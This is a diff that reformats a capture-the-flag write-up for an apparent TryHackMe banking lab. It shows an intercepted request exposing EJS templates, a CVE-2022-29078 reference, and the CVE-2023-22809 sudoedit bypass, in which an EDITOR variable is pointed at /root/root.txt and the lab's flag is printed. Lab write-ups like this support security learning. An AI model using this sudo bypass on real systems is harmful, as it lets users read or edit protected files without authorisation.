@@ -50,6 +50,8 @@ http://admin.cyprusbank.thm/messages/?c=10
 
 Using Burp Suite to intercept the request, modify the password parameter and observe an error message indicating that EJS files are being used.
 ```
+Request:
+
 POST /settings HTTP/1.1
 Host: admin.cyprusbank.thm
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
@@ -68,8 +70,11 @@ Priority: u=0, i
 name=test&password1=test
 ```
 ```
+Response:
+
 ReferenceError: /home/web/app/views/settings.ejs:14
 ```
+
 # CVE-2022–29078
 
 https://security.snyk.io/vuln/SNYK-JS-EJS-2803307
@@ -119,6 +124,11 @@ User web may run the following commands on cyprusbank:
 
 # CVE-2023–22809
 
+It allows us to bypass to read or edit any file by manipulating the EDITOR variable.
+
+https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis
+
+```
 $ sudoedit -V
 Sudo version 1.9.12p1
 Sudoers policy plugin version 1.9.12p1
@@ -129,8 +139,8 @@ $ export EDITOR="vi -- /root/root.txt"
 $ echo $EDITOR
 vi -- /root/root.txt
 $     sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
-
-
+```
+```
 THM{4nd_uR_p4ck4g3s}
 ~                                                                               
 ~                                                                               
@@ -138,4 +148,4 @@ THM{4nd_uR_p4ck4g3s}
 ~                                                                               
 ~                                                                               
 "/var/tmp/rootZWkIXB0v.txt" 1L, 21C                           1,1           All
-
+```
